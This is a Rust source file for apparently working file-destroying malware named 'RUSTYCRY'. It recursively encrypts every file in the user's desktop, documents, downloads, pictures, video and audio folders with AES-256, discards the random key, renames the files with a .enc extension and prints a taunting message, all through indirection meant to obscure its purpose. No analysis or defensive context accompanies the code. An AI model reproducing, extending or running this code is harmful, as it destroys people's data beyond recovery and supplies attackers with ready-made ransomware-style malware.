use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use walkdir::WalkDir;
use rand::{Rng, thread_rng};
use rand::distributions::Standard;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::PathBuf;
use std::convert::TryInto;
use dirs::{desktop_dir, document_dir, download_dir, picture_dir, video_dir, audio_dir};
type EncCbc = Cbc<Aes256, Pkcs7>;

fn entrypt() {
    let (key, iv) = keyiv();
    let common_dirs = vec![
        desktop_dir(),
        document_dir(),
        download_dir(),
        picture_dir(),
        video_dir(),
        audio_dir(),
    ];
    for dir in common_dirs {
        if let Some(path) = dir {
            stomp(key, iv, path);
        }
    }
    for _ in 0..100 {
        println!("REST IN PEACE: YOUR FILE SYSTEM - YOURS FAITHFULLY, RUSTYCRY");
    }
    println!("\nPress Enter to exit...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}
fn keyiv() -> ([u8; 32], [u8; 16]) {
    let generate_iv: fn() -> ([u8; 32], [u8; 16]) = genkeyiv;
    generate_iv()
}
fn genkeyiv() -> ([u8; 32], [u8; 16]) {
    let rng = thread_rng();
    let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
    let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
    (key, iv)
}
fn stomp(key: [u8; 32], iv: [u8; 16], start_dir: PathBuf) {
    for entry in WalkDir::new(start_dir) {
        let entry = entry.unwrap();
        if entry.file_type().is_file() {
            let path = entry.path().to_path_buf();
            encf(&path, &key, &iv);
        }
    }
}
fn encf(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
    let obscure_function: fn(&PathBuf, &[u8; 32], &[u8; 16]) = encf2;
    obscure_function(path, key, iv)
}
fn encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) {
    match try_encf2(path, key, iv) {
        Ok(_) => println!("Successfully encrypted: {:?}", path),
        Err(e) => println!("Failed to encrypt {:?}: {}", path, e),
    }
}
fn try_encf2(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
    let content = readcon(path)?;
    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
    let encrypted_data = cipher.encrypt_vec(&content);
    writecon(path, &encrypted_data)?;
    renamef(path)?;
    Ok(())
}
fn readcon(path: &PathBuf) -> std::io::Result<Vec<u8>> {
    let mut file = File::open(&path)?;
    let mut content = Vec::new();
    file.read_to_end(&mut content)?;
    Ok(content)
}
fn writecon(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
    let mut file = File::create(&path)?;
    file.write_all(content)?;
    Ok(())
}
fn renamef(path: &PathBuf) -> std::io::Result<()> {
    let new_name = format!("{}.enc", path.to_str().unwrap());
    fs::rename(path, new_name)?;
    Ok(())
}
fn main() {
    entrypt();
}
